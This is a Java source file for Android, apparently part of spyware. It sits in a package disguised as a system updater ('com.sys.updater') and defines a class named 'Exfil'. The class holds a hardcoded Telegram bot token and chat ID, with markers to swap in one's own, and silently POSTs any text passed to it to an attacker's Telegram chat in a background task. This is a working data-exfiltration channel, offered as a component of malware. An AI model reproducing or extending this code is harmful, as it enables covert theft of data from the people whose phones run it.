package com.sys.updater;

import android.os.AsyncTask;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exfil {
    private static final String BOT_TOKEN = "8624726401:AAF0OfA_I0vxNPkeEucmLFCU6CBff7ynbUk"; // <--- BEDEL
    private static final String CHAT_ID = "8431994335"; // <--- BEDEL

    public static void send(String text) {
        new SendTask().execute(text);
    }

    private static class SendTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String text = params[0];
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                    os.flush();
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }
      }
